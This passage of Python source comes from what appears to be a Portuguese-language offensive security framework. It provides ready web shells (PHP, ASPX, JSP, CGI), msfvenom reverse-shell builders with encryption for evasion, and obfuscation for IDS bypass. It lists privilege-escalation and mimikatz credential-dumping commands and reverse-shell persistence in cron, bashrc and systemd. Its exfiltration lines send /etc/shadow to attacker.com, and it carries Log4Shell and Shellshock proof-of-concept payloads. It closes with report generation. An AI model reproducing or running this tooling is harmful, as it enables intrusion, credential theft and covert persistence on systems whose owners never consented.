            "php_full":    "<?php if(isset($_REQUEST['cmd'])){$cmd=$_REQUEST['cmd'];echo '<pre>';system($cmd);echo '</pre>';}else{echo 'Usage: ?cmd=id';}?>",
            "php_stealth": "<?php eval(base64_decode($_POST['x']));?>",
            "php_pass":    "<?php if(md5($_GET['pass'])=='098f6bcd4621d373cade4e832627b4f6'){system($_GET['cmd']);}?>",
            "aspx":        "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"cmd\"],\"unsafe\");%>",
            "jsp":         """<%@ page import="java.io.*" %><%
String cmd = request.getParameter("cmd");
if(cmd!=null){
Process p = Runtime.getRuntime().exec(cmd);
InputStream in = p.getInputStream();
int a; while((a=in.read())!=-1)out.print((char)a);
}%>""",
            "war_cmd": "echo 'deploy war manual para RCE em Tomcat'",
            "python_cgi":  """#!/usr/bin/env python3
import cgi, os
form = cgi.FieldStorage()
cmd = form.getvalue('cmd', 'id')
print("Content-Type: text/plain\\n")
os.system(cmd)""",
        }
        
        print(f"\n{C.CYAN}{'─'*50}{C.RESET}")
        print(f"  {C.BOLD}Web Shells Disponíveis:{C.RESET}")
        for name, shell in shells.items():
            print(f"\n  {C.YELLOW}[{name}]{C.RESET}")
            print(f"  {C.DIM}{shell[:100]}...{C.RESET}" if len(shell) > 100 else f"  {shell}")
        print(f"{C.CYAN}{'─'*50}{C.RESET}\n")
        return shells

    def msfvenom_helper(self, payload_type: str, lhost: str, lport: str,
                        fmt: str = "elf", encoder: str = "") -> str:
        """Gera comandos msfvenom completos"""
        payloads_map = {
            "linux/x64/rev":    "linux/x64/shell/reverse_tcp",
            "linux/x86/rev":    "linux/x86/shell_reverse_tcp",
            "windows/rev":      "windows/meterpreter/reverse_tcp",
            "windows/x64/rev":  "windows/x64/meterpreter/reverse_tcp",
            "windows/stageless":"windows/x64/shell_reverse_tcp",
            "osx/rev":          "osx/x64/shell_reverse_tcp",
            "android/rev":      "android/meterpreter/reverse_tcp",
            "python/rev":       "python/meterpreter/reverse_tcp",
            "java/rev":         "java/meterpreter/reverse_tcp",
            "php/rev":          "php/meterpreter/reverse_tcp",
        }
        
        payload = payloads_map.get(payload_type, payload_type)
        
        cmds = []
        
        # Comando base
        base_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt}"
        if encoder:
            base_cmd += f" -e {encoder} -i 5"
        base_cmd += " -o payload." + fmt
        cmds.append(("Básico", base_cmd))
        
        # Com evasão
        evade_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt} --encrypt aes256 --encrypt-key $(openssl rand -hex 16) -o payload_enc.{fmt}"
        cmds.append(("Encrypted", evade_cmd))
        
        # Template injection
        if "windows" in payload_type:
            template_cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -x /usr/share/windows-binaries/plink.exe -f exe -o payload_template.exe"
            cmds.append(("Template", template_cmd))
        
        # Listener MSF
        listener = f"""use exploit/multi/handler
set payload {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j"""
        
        print(f"\n{C.CYAN}{'═'*60}{C.RESET}")
        print(f"  {C.BOLD}MSFvenom Helper{C.RESET}")
        print(f"  Payload: {payload}")
        print(f"  LHOST: {lhost} | LPORT: {lport}")
        print(f"{C.CYAN}{'═'*60}{C.RESET}")
        
        for name, cmd in cmds:
            print(f"\n  {C.YELLOW}[{name}]{C.RESET}")
            print(f"  {cmd}")
        
        print(f"\n  {C.YELLOW}[MSF Listener]{C.RESET}")
        print(f"  msfconsole -q -x \"{listener.replace(chr(10), '; ')}\"")
        print()
        
        return base_cmd

    def generate_wordlist(self, keywords: List[str], mutations: bool = True) -> List[str]:
        """Gera wordlist customizada a partir de keywords"""
        words = set(keywords)
        
        if mutations:
            for kw in list(keywords):
                words.add(kw.lower())
                words.add(kw.upper())
                words.add(kw.capitalize())
                words.add(kw + "123")
                words.add(kw + "!")
                words.add(kw + "@123")
                words.add(kw + "2024")
                words.add(kw + "2025")
                words.add(kw + "2026")
                words.add(kw + "#1")
                words.add("@" + kw)
                words.add(kw[::-1])  # reverse
                # Substituições l33t
                l33t = kw.lower().replace("a","@").replace("e","3").replace("i","1").replace("o","0")
                words.add(l33t)
                words.add(l33t.capitalize())
        
        wordlist = sorted(list(words))
        fname = os.path.join(WORKSPACE_DIR, f"custom_wordlist_{int(time.time())}.txt")
        with open(fname, "w") as f:
            f.write("\n".join(wordlist))
        
        log.success(f"Wordlist gerada: {fname} ({len(wordlist)} entradas)")
        return wordlist

    def obfuscate_command(self, cmd: str, technique: str = "all") -> Dict[str, str]:
        """Técnicas de obfuscação de comandos"""
        results = {}
        
        # Base64
        b64 = base64.b64encode(cmd.encode()).decode()
        results["base64_bash"] = f"echo {b64} | base64 -d | bash"
        results["base64_python"] = f"python3 -c \"import base64,os;os.system(base64.b64decode('{b64}').decode())\""
        
        # Hex encoding
        hex_cmd = cmd.encode().hex()
        results["hex_echo"] = f"echo -n '{hex_cmd}' | xxd -r -p | bash"
        
        # Variable splitting (bypass simples de IDS)
        if " " in cmd:
            parts = cmd.split()
            var_cmd = f"a={parts[0]};" + ";".join(f"b{i}={p}" for i,p in enumerate(parts[1:])) 
            results["var_split"] = var_cmd
        
        # IFS bypass
        results["ifs_bypass"] = cmd.replace(" ", "${IFS}")
        
        # Single quotes bypass
        results["quote_insert"] = "".join([f"'{c}'" if c.isalpha() else c for c in cmd[:20]]) + "..."
        
        print(f"\n{C.CYAN}{'─'*50}{C.RESET}")
        print(f"  {C.BOLD}Técnicas de Obfuscação:{C.RESET}")
        for k, v in results.items():
            print(f"\n  {C.YELLOW}[{k}]{C.RESET}")
            print(f"  {v}")
        print(f"{C.CYAN}{'─'*50}{C.RESET}\n")
        return results

payload_gen = PayloadGenerator()

# ─────────────────────────────────────────────
#  MÓDULO: POST-EXPLOITATION
# ─────────────────────────────────────────────
class PostExploitModule:
    def __init__(self):
        self.name = "Post-Exploitation"

    def linux_privesc_checks(self) -> str:
        """Checklist de escalação de privilégios Linux"""
        checks = {
            "SUID Binaries": "find / -perm -4000 -type f 2>/dev/null",
            "SGID Binaries": "find / -perm -2000 -type f 2>/dev/null",
            "World Writable": "find / -perm -o+w -not -path '/proc/*' 2>/dev/null",
            "Capabilities": "getcap -r / 2>/dev/null",
            "Sudo Rights": "sudo -l 2>/dev/null",
            "Cron Jobs": "cat /etc/cron* /var/spool/cron/* /etc/crontab 2>/dev/null",
            "PATH Writable": "for d in $(echo $PATH | tr ':' ' '); do ls -ld $d 2>/dev/null | grep -v '^d.*root.*root'; done",
            "NFS Shares": "cat /etc/exports 2>/dev/null",
            "SSH Keys": "find / -name id_rsa -o -name id_ecdsa -o -name authorized_keys 2>/dev/null",
            "Password Files": "find / -name '*.conf' -o -name '*.config' 2>/dev/null | xargs grep -l 'password' 2>/dev/null | head -20",
            "Docker Group": "id && groups",
            "LXC/LXD Group": "id | grep -E 'lxc|lxd'",
            "Disk Group": "id | grep disk",
            "Kernel Version": "uname -a",
            "OS Version": "cat /etc/os-release",
            "Running Services": "ps aux | grep root",
            "Network Connections": "netstat -antp 2>/dev/null || ss -antp",
            "Listening Services": "netstat -tulnp 2>/dev/null || ss -tulnp",
            "Env Variables": "env",
            "History Files": "cat ~/.bash_history ~/.zsh_history ~/.sh_history 2>/dev/null",
            "Writable /etc": "ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null",
            "MySQL NoPass": "mysql -u root --connect-timeout=3 -e 'show databases' 2>&1",
            "Writable Scripts in Cron": "cat /etc/cron* 2>/dev/null | grep -v '#' | awk '{print $6}' | xargs ls -la 2>/dev/null",
        }
        
        gtfobins_ref = """
  GTFOBins Referência Rápida (https://gtfobins.github.io):
  
  SUID Shell Escape:
    find      → find . -exec /bin/sh -p \\; -quit
    vim       → :set shell=/bin/sh | :shell
    python    → python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
    perl      → perl -e 'exec "/bin/sh";'
    nmap      → nmap --interactive → !sh (versões antigas)
    awk       → awk 'BEGIN {system("/bin/sh")}'
    less/more → !/bin/sh
    man       → !/bin/sh
    env       → env /bin/sh -p
    bash      → bash -p
    cp        → cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p
    
  Sudo Bypass:
    (ALL) NOPASSWD: /usr/bin/vim  → sudo vim -c '!sh'
    (ALL) NOPASSWD: /usr/bin/find → sudo find . -exec /bin/sh \\; -quit
    (ALL) NOPASSWD: /usr/bin/python → sudo python -c 'import pty;pty.spawn("/bin/sh")'
    
  Capabilities:
    python3 cap_setuid → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
    openssl cap_net_raw → openssl s_server ... 
"""
        
        print(f"\n{C.CYAN}{'═'*60}{C.RESET}")
        print(f"  {C.BOLD}Linux Privilege Escalation Checklist{C.RESET}")
        print(f"{C.CYAN}{'═'*60}{C.RESET}\n")
        
        all_commands = []
        for check_name, cmd in checks.items():
            print(f"  {C.YELLOW}[{check_name}]{C.RESET}")
            print(f"  {cmd}\n")
            all_commands.append(cmd)
        
        print(gtfobins_ref)
        
        # Gerar script one-liner
        script = "#!/bin/bash\n# JARVIS Linux PrivEsc Script\n\n"
        for name, cmd in checks.items():
            script += f'echo "=== {name} ==="\n{cmd}\necho ""\n\n'
        
        fname = os.path.join(WORKSPACE_DIR, f"privesc_check_{int(time.time())}.sh")
        with open(fname, "w") as f:
            f.write(script)
        os.chmod(fname, 0o755)
        log.success(f"Script gerado: {fname}")
        return "\n".join(all_commands)

    def windows_privesc_checks(self) -> str:
        """Checklist Windows PrivEsc"""
        checks = {
            "System Info": "systeminfo",
            "Current User": "whoami /all",
            "Local Users": "net user",
            "Local Admins": "net localgroup administrators",
            "Running Services": "Get-Service | Where-Object {$_.Status -eq 'Running'}",
            "Installed Software": "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select DisplayName,DisplayVersion",
            "Scheduled Tasks": "schtasks /query /fo LIST /v",
            "AlwaysInstallElevated": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "Unquoted Service Paths": "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v '\"'",
            "Weak Service Perms": "accesschk.exe -uwcqv * 2>nul",
            "AutoRun": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "Stored Credentials": "cmdkey /list",
            "PowerShell History": "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
            "SAM/SYSTEM": "reg save HKLM\\SAM sam.hive && reg save HKLM\\SYSTEM system.hive",
            "Mimikatz (se admin)": r'.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
            "Dump NTLM": r'.\mimikatz.exe "lsadump::sam" exit',
            "Pass-the-Hash": r'.\mimikatz.exe "sekurlsa::pth /user:admin /domain:. /ntlm:HASH /run:cmd.exe" exit',
            "Token Impersonation": r'.\PrintSpoofer.exe -i -c cmd',
            "Hot Potato": r'.\RottenPotato.exe',
            "Juicy Potato": r'.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > c:\test.txt" -t *',
        }
        
        print(f"\n{C.CYAN}{'═'*60}{C.RESET}")
        print(f"  {C.BOLD}Windows Privilege Escalation Checklist{C.RESET}")
        print(f"{C.CYAN}{'═'*60}{C.RESET}\n")
        for name, cmd in checks.items():
            print(f"  {C.YELLOW}[{name}]{C.RESET}")
            print(f"  {cmd}\n")
        return str(checks)

    def persistence_techniques(self, os_type: str = "linux") -> None:
        """Técnicas de persistência"""
        if os_type == "linux":
            techniques = {
                "Cron Job": "echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/LHOST/LPORT 0>&1\"' >> /etc/crontab",
                "SSH Authorized Keys": "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
                "Bashrc": "echo 'nohup bash -i >& /dev/tcp/LHOST/LPORT 0>&1 &' >> ~/.bashrc",
                "Systemd Service": """cat > /etc/systemd/system/sshd-update.service << EOF
[Unit]
Description=SSH Update Service
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable sshd-update.service""",
                "LD_PRELOAD": "echo '/lib/malicious.so' >> /etc/ld.so.preload",
                "PAM Backdoor": "apt install libpam-python && # editar pam.d",
                "MOTD Script": "echo 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /etc/update-motd.d/99-backdoor",
            }
        else:  # Windows
            techniques = {
                "Registry Run": "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v backdoor /t REG_SZ /d 'C:\\backdoor.exe'",
                "Scheduled Task": "schtasks /create /tn 'Windows Update' /tr 'C:\\backdoor.exe' /sc minute /mo 5",
                "Startup Folder": "copy backdoor.exe %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\",
                "Service Install": "sc create backdoor binPath= 'C:\\backdoor.exe' start= auto && sc start backdoor",
                "DLL Hijacking": "# Substituir DLL em path com prioridade maior",
                "WMI Subscription": "# Usar WMI event subscription para persistência sofisticada",
            }
        
        print(f"\n{C.CYAN}{'═'*60}{C.RESET}")
        print(f"  {C.BOLD}Técnicas de Persistência — {os_type.upper()}{C.RESET}")
        print(f"{C.CYAN}{'═'*60}{C.RESET}\n")
        for name, cmd in techniques.items():
            print(f"  {C.YELLOW}[{name}]{C.RESET}")
            print(f"  {cmd}\n")

    def data_exfil_techniques(self) -> None:
        """Técnicas de exfiltração de dados"""
        techniques = {
            "DNS Exfil": "for f in $(cat /etc/passwd | base64 -w30); do dig $f.attacker.com; done",
            "ICMP Exfil": "ping -c 1 $(cat /etc/passwd | head -1 | base64 | head -c 20).attacker.com",
            "HTTP POST": "curl -X POST -d @/etc/shadow http://attacker.com/receive",
            "Python HTTP": "python3 -m http.server 8080  # no alvo, baixar do atacante",
            "SCP": "scp /etc/shadow user@attacker.com:/loot/",
            "Netcat": "cat /etc/passwd | nc attacker.com 9001",
            "Base64 via RCE": "cat /etc/passwd | base64 # copiar output via RCE",
            "Steganografia": "steghide embed -cf image.jpg -sf secret.txt",
            "Encode in image": "cat /etc/passwd | xxd | curl -X POST http://attacker.com/img.php",
            "Time-based": "# Exfil via timing de respostas (muito lento mas evasivo)",
        }
        
        print(f"\n{C.CYAN}{'─'*50}{C.RESET}")
        print(f"  {C.BOLD}Técnicas de Exfiltração{C.RESET}")
        print(f"{C.CYAN}{'─'*50}{C.RESET}\n")
        for name, cmd in techniques.items():
            print(f"  {C.YELLOW}[{name}]{C.RESET}")
            print(f"  {cmd}\n")

    def lateral_movement(self) -> None:
        """Técnicas de lateral movement"""
        techniques = {
            "Pass-the-Hash": "pth-winexe -U DOMAIN/user%NTLM_HASH //TARGET cmd",
            "Pass-the-Ticket": r'.\Rubeus.exe ptt /ticket:BASE64',
            "SSH Agent": "ssh-add /path/to/key && ssh -A user@pivot 'ssh user@internal'",
            "SSH Port Forward": "ssh -L 3389:internal:3389 -N user@pivot",
            "SSH SOCKS": "ssh -D 1080 -N user@pivot",
            "Chisel": "# Servidor: chisel server -p 8000 --reverse\n  # Cliente: chisel client attacker:8000 R:socks",
            "Ligolo-ng": "# Proxy túnel rápido para acesso à rede interna",
            "rpcclient": "rpcclient -U user%pass target # enumerar via RPC",
            "WinRM": "evil-winrm -i target -u user -p pass",
            "PSExec": "psexec.py DOMAIN/user:pass@target cmd.exe",
            "WMIExec": "wmiexec.py DOMAIN/user:pass@target",
            "SMBExec": "smbexec.py DOMAIN/user:pass@target",
            "CrackMapExec": "crackmapexec smb CIDR -u user -p pass --shares",
            "BloodHound": "# SharpHound.exe --CollectionMethods All && import no BloodHound",
        }
        
        print(f"\n{C.CYAN}{'─'*50}{C.RESET}")
        print(f"  {C.BOLD}Lateral Movement Techniques{C.RESET}")
        print(f"{C.CYAN}{'─'*50}{C.RESET}\n")
        for name, cmd in techniques.items():
            print(f"  {C.YELLOW}[{name}]{C.RESET}")
            print(f"  {cmd}\n")

post_exploit = PostExploitModule()

# ─────────────────────────────────────────────
#  MÓDULO: REPORTING ENGINE
# ─────────────────────────────────────────────
class ReportEngine:
    def __init__(self):
        self.name = "Report Engine"

    def generate_html(self, title: str = "Pentest Report") -> str:
        """Gera relatório HTML completo"""
        findings = log.findings
        creds = session.creds
        
        severity_colors = {
            "CRITICAL": "#ff0000", "HIGH": "#ff6600",
            "MEDIUM": "#ffcc00", "LOW": "#3399ff", "INFO": "#999999"
        }
        
        findings_html = ""
        for f in findings:
            color = severity_colors.get(f["severity"], "#999")
            findings_html += f"""
            <div class="finding">
                <div class="severity" style="background:{color}">{f['severity']}</div>
                <h3>{f['title']}</h3>
                <p><strong>Target:</strong> {f['target']}</p>
                <p><strong>Description:</strong> {f['description']}</p>
                <p><small>{f['time']}</small></p>
            </div>"""
        
        creds_html = ""
        for c in creds:
            creds_html += f"""
            <tr>
                <td>{c['service']}</td>
                <td>{c['user']}</td>
                <td class="cred-pwd">{c['pwd']}</td>
                <td>{c['source']}</td>
                <td>{c['time'][:19]}</td>
            </tr>"""
        
        html = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>{title}</title>
<style>
  * {{ margin:0; padding:0; box-sizing:border-box; }}
  body {{ font-family:'Segoe UI',sans-serif; background:#0a0a0a; color:#e0e0e0; }}
  .header {{ background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460); padding:40px; text-align:center; border-bottom:2px solid #e94560; }}
  .header h1 {{ font-size:2.5em; color:#e94560; text-transform:uppercase; letter-spacing:3px; }}
  .header h2 {{ color:#a0a0c0; font-size:1.1em; margin-top:10px; }}
  .meta {{ display:flex; justify-content:space-around; padding:20px; background:#111; border-bottom:1px solid #333; }}
  .meta-item {{ text-align:center; }}
  .meta-item .val {{ font-size:2em; font-weight:bold; color:#e94560; }}
  .meta-item .lbl {{ color:#777; font-size:0.85em; }}
  .section {{ margin:30px; }}
  .section h2 {{ color:#e94560; border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:20px; font-size:1.4em; text-transform:uppercase; letter-spacing:2px; }}
  .finding {{ background:#111; border-left:4px solid #e94560; padding:20px; margin:15px 0; border-radius:4px; }}
  .finding h3 {{ color:#e0e0e0; margin:10px 0 5px; }}
  .finding p {{ color:#a0a0a0; margin:3px 0; }}
  .severity {{ display:inline-block; padding:4px 12px; border-radius:3px; font-weight:bold; font-size:0.8em; color:#fff; }}
  table {{ width:100%; border-collapse:collapse; }}
  th {{ background:#1a1a2e; color:#e94560; padding:10px; text-align:left; }}
  td {{ padding:10px; border-bottom:1px solid #222; }}
  .cred-pwd {{ color:#ff6b6b; font-family:monospace; }}
  .footer {{ text-align:center; padding:30px; color:#444; border-top:1px solid #222; margin-top:40px; }}
  .badge-critical {{ background:#ff0000; }}
  .badge-high {{ background:#ff6600; }}
  .badge-medium {{ background:#cc9900; }}
  .badge-low {{ background:#3399ff; }}
  .summary-grid {{ display:grid; grid-template-columns:repeat(4,1fr); gap:15px; margin:20px 0; }}
  .summary-card {{ background:#111; border:1px solid #333; padding:20px; border-radius:8px; text-align:center; }}
  .summary-card .num {{ font-size:2.5em; font-weight:bold; }}
  code {{ background:#1a1a2e; padding:2px 6px; border-radius:3px; font-size:0.9em; color:#7eb6ff; }}
  pre {{ background:#0d1117; padding:15px; border-radius:5px; overflow-x:auto; color:#7eb6ff; }}
</style>
</head>
<body>
<div class="header">
  <h1>⚡ {title}</h1>
  <h2>JARVIS Security Framework — Relatório de Pentest</h2>
  <p style="color:#666;margin-top:15px">Sessão: {session.id} | {session.start.strftime('%Y-%m-%d %H:%M')} | Target: {session.target or 'N/A'}</p>
</div>

<div class="meta">
  <div class="meta-item"><div class="val">{len([f for f in findings if f['severity']=='CRITICAL'])}</div><div class="lbl">CRITICAL</div></div>
  <div class="meta-item"><div class="val">{len([f for f in findings if f['severity']=='HIGH'])}</div><div class="lbl">HIGH</div></div>
  <div class="meta-item"><div class="val">{len([f for f in findings if f['severity']=='MEDIUM'])}</div><div class="lbl">MEDIUM</div></div>
  <div class="meta-item"><div class="val">{len(creds)}</div><div class="lbl">CREDENCIAIS</div></div>
  <div class="meta-item"><div class="val">{len(findings)}</div><div class="lbl">TOTAL FINDINGS</div></div>
</div>

<div class="section">
  <h2>📋 Resumo Executivo</h2>
  <p style="color:#a0a0a0;line-height:1.8">
    Este relatório apresenta os resultados do teste de penetração realizado contra o alvo 
    <strong style="color:#e94560">{session.target or 'N/A'}</strong>.
    Foram identificados <strong>{len(findings)}</strong> findings, sendo 
    <strong style="color:#ff0000">{len([f for f in findings if f['severity']=='CRITICAL'])}</strong> críticos
    e <strong style="color:#ff6600">{len([f for f in findings if f['severity']=='HIGH'])}</strong> de alta severidade.
    {len(creds)} conjuntos de credenciais foram obtidos durante o teste.
  </p>
</div>

<div class="section">
  <h2>🔴 Findings de Vulnerabilidades</h2>
  {findings_html if findings_html else '<p style="color:#666">Nenhum finding registrado.</p>'}
</div>

<div class="section">
  <h2>🔑 Credenciais Obtidas</h2>
  {'<table><tr><th>Serviço</th><th>Usuário</th><th>Senha</th><th>Fonte</th><th>Timestamp</th></tr>' + creds_html + '</table>' if creds_html else '<p style="color:#666">Nenhuma credencial obtida.</p>'}
</div>

<div class="section">
  <h2>📊 Informações da Sessão</h2>
  <pre>ID: {session.id}
Target: {session.target}
Início: {session.start.isoformat()}
Loot Items: {len(session.loot)}
Notas: {len(session.notes)}</pre>
</div>

<div class="footer">
  <p>Gerado por JARVIS Ultra Pro Max {VERSION} — {CODENAME}</p>
  <p style="margin-top:5px">Uso restrito a ambientes autorizados</p>
</div>
</body>
</html>"""
        
        fname = os.path.join(REPORT_DIR, f"report_{session.id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")
        with open(fname, "w") as f:
            f.write(html)
        log.success(f"Relatório HTML: {fname}")
        return fname

    def generate_json(self) -> str:
        data = {
            "meta": {
                "version": VERSION,
                "session": session.id,
                "target": session.target,
                "start": session.start.isoformat(),
                "generated": datetime.now().isoformat()
            },
            "findings": log.findings,
            "credentials": session.creds,
            "scan_results": session.scan_results,
            "loot": [{"name": l["name"], "type": l["type"]} for l in session.loot],
            "notes": session.notes,
            "vuln_results": session.vuln_results
        }
        fname = os.path.join(REPORT_DIR, f"report_{session.id}.json")
        with open(fname, "w") as f:
            json.dump(data, f, indent=2)
        log.success(f"Relatório JSON: {fname}")
        return fname

    def generate_markdown(self) -> str:
        lines = [
            f"# Pentest Report — Session {session.id}",
            f"**Target:** {session.target or 'N/A'}",
            f"**Date:** {session.start.strftime('%Y-%m-%d %H:%M')}",
            f"**Tool:** JARVIS {VERSION}\n",
            "---\n",
            "## Executive Summary\n",
            f"- **Total Findings:** {len(log.findings)}",
            f"- **Critical:** {len([f for f in log.findings if f['severity']=='CRITICAL'])}",
            f"- **High:** {len([f for f in log.findings if f['severity']=='HIGH'])}",
            f"- **Credentials:** {len(session.creds)}\n",
            "---\n",
            "## Findings\n"
        ]
        
        for f in log.findings:
            lines.extend([
                f"### [{f['severity']}] {f['title']}",
                f"- **Target:** {f['target']}",
                f"- **Description:** {f['description']}",
                f"- **Timestamp:** {f['time']}\n"
            ])
        
        if session.creds:
            lines.extend(["---\n", "## Credentials\n", "| Service | User | Password | Source |", "|---------|------|----------|--------|"])
            for c in session.creds:
                lines.append(f"| {c['service']} | {c['user']} | `{c['pwd']}` | {c['source']} |")
        
        content = "\n".join(lines)
        fname = os.path.join(REPORT_DIR, f"report_{session.id}.md")
        with open(fname, "w") as f:
            f.write(content)
        log.success(f"Relatório Markdown: {fname}")
        return fname

report = ReportEngine()

# ─────────────────────────────────────────────
#  MÓDULO: AUTOMATION ENGINE
# ─────────────────────────────────────────────
class AutomationEngine:
    def __init__(self):
        self.name = "Automation Engine"
        self.macros: Dict[str, List[str]] = {}
        self.macro_file = os.path.join(WORKSPACE_DIR, "macros.json")
        self._load_macros()

    def _load_macros(self):
        if os.path.exists(self.macro_file):
            with open(self.macro_file) as f:
                self.macros = json.load(f)

    def _save_macros(self):
        with open(self.macro_file, "w") as f:
            json.dump(self.macros, f, indent=2)

    def full_recon(self, target: str) -> Dict:
        """Pipeline completo de reconhecimento"""
        results = {}
        log.info(f"{'─'*50}")
        log.info(f"PIPELINE FULL RECON: {target}")
        log.info(f"{'─'*50}")
        
        session.target = target
        
        # Detectar tipo de alvo
        is_ip = True
        try:
            ipaddress.ip_address(target)
        except ValueError:
            is_ip = False
        
        if not is_ip:
            # É um domínio
            log.info("[1/7] DNS Lookup...")
            results["dns"] = recon.dns_lookup(target)
            
            log.info("[2/7] Certificate Transparency...")
            results["ct_subs"] = recon.certificate_transparency(target)
            
            log.info("[3/7] Subdomain Enumeration...")
            results["subdomains"] = recon.subdomain_enum(target)
            
            log.info("[4/7] WHOIS...")
            results["whois"] = recon.whois_lookup(target)
            
            log.info("[5/7] Tech Detection...")
            results["technologies"] = recon.tech_detect(f"http://{target}")
            
            log.info("[6/7] HTTP Headers Analysis...")
            results["headers"] = recon.http_headers(target)
            
            # Resolver IP
            try:
                ip = socket.gethostbyname(target)
                log.info(f"[7/7] Port Scan no IP {ip}...")
                results["ports"] = scanner.port_scan(ip)
                results["os_guess"] = scanner.os_fingerprint(ip)
            except Exception:
                log.warn("Não foi possível resolver IP para port scan")
        else:
            # É um IP
            log.info("[1/4] OS Fingerprint...")
            results["os_guess"] = scanner.os_fingerprint(target)
            
            log.info("[2/4] Port Scan...")
            results["ports"] = scanner.port_scan(target)
            
            log.info("[3/4] Service Versions...")
            for port in list(results.get("ports", {}).keys())[:5]:
                banner = scanner.service_version(target, port)
                if banner:
                    results.setdefault("banners", {})[port] = banner
            
            log.info("[4/4] UDP Scan...")
            results["udp"] = scanner.udp_scan(target)
        
        session.scan_results.update(results)
        
        # Análise IA
        if ai.active:
            log.ai("Analisando resultados com IA...")
            scan_summary = json.dumps({
                k: v for k, v in results.items()
                if k not in ["whois"]  # evitar excesso
            }, indent=2, default=str)[:3000]
            analysis = ai.analyze_target(target, scan_summary)
            results["ai_analysis"] = analysis
            print(f"\n{C.AI}[IA Analysis]{C.RESET}")
            print(analysis)
        
        log.success(f"Full Recon concluído em {target}")
        return results

    def full_web_audit(self, url: str) -> Dict:
        """Auditoria web completa"""
        results = {}
        log.info(f"PIPELINE FULL WEB AUDIT: {url}")
        
        log.info("[1/8] Headers de Segurança...")
        results["headers"] = recon.http_headers(url)
        
        log.info("[2/8] Detecção de Tecnologias...")
        results["techs"] = recon.tech_detect(url)
        log.info(f"Tecnologias: {', '.join(results['techs'])}")
        
        log.info("[3/8] CMS Detection...")
        results["cms"] = web.cms_detect(url)
        
        log.info("[4/8] Directory Bruteforce...")
        results["dirs"] = web.dir_bruteforce(url)
        
        log.info("[5/8] CORS Check...")
        results["cors"] = web.cors_check(url)
        
        log.info("[6/8] SQL Injection Test (parâmetros padrão)...")
        test_url = url + ("?" if "?" not in url else "&") + "id=1"
        results["sqli"] = web.sql_injection_test(test_url)
        
        log.info("[7/8] XSS Test...")
        results["xss"] = web.xss_test(test_url)
        
        log.info("[8/8] LFI Test...")
        test_url2 = url + ("?" if "?" not in url else "&") + "page=index"
        results["lfi"] = web.lfi_test(test_url2)
        
        log.success(f"Web Audit concluído: {url}")
        return results

    def save_macro(self, name: str, commands: List[str]):
        self.macros[name] = commands
        self._save_macros()
        log.success(f"Macro '{name}' salvo ({len(commands)} comandos)")

    def run_macro(self, name: str) -> bool:
        if name not in self.macros:
            log.error(f"Macro '{name}' não encontrado")
            return False
        cmds = self.macros[name]
        log.info(f"Executando macro '{name}' ({len(cmds)} comandos)...")
        # Isso seria processado pelo CLI
        return True

    def list_macros(self):
        if not self.macros:
            log.info("Nenhum macro salvo")
            return
        print(f"\n  {C.CYAN}Macros Salvos:{C.RESET}")
        for name, cmds in self.macros.items():
            print(f"  {C.YELLOW}{name}{C.RESET} ({len(cmds)} comandos)")
            for c in cmds[:3]:
                print(f"    {C.DIM}→ {c}{C.RESET}")

automation = AutomationEngine()

# ─────────────────────────────────────────────
#  VULNERABILIDADE DATABASE LOCAL
# ─────────────────────────────────────────────
class VulnDB:
    def __init__(self):
        self.vulns = {
            # Web
            "log4shell": {
                "cve": "CVE-2021-44228", "cvss": 10.0, "severity": "CRITICAL",
                "desc": "Apache Log4j2 JNDI injection RCE via ${jndi:ldap://...}",
                "payload": "${jndi:ldap://attacker.com/exploit}",
                "affect": "Log4j2 2.0-beta9 a 2.14.1",
                "poc": "curl -H 'User-Agent: ${jndi:ldap://attacker.com/a}' http://target/"
            },
            "shellshock": {
                "cve": "CVE-2014-6271", "cvss": 10.0, "severity": "CRITICAL",
                "desc": "Bash arbitrary code execution via env variable",
                "payload": "() { :; }; /bin/bash -c 'id'",
                "affect": "Bash < 4.3",
                "poc": "curl -H 'User-Agent: () { :; }; /bin/bash -c id' http://target/cgi-bin/test.cgi"
            },
            "heartbleed": {
                "cve": "CVE-2014-0160", "cvss": 7.5, "severity": "HIGH",
                "desc": "OpenSSL memory disclosure via TLS heartbeat",
                "affect": "OpenSSL 1.0.1 a 1.0.1f",
                "poc": "use auxiliary/scanner/ssl/openssl_heartbleed no metasploit"
            },
            "eternalblue": {
                "cve": "CVE-2017-0144", "cvss": 9.3, "severity": "CRITICAL",
                "desc": "SMBv1 buffer overflow RCE (WannaCry, NotPetya)",
                "affect": "Windows XP/7/Server 2003/2008",
                "poc": "use exploit/windows/smb/ms17_010_eternalblue"
            },
            "printnightmare": {
                "cve": "CVE-2021-34527", "cvss": 8.8, "severity": "HIGH",
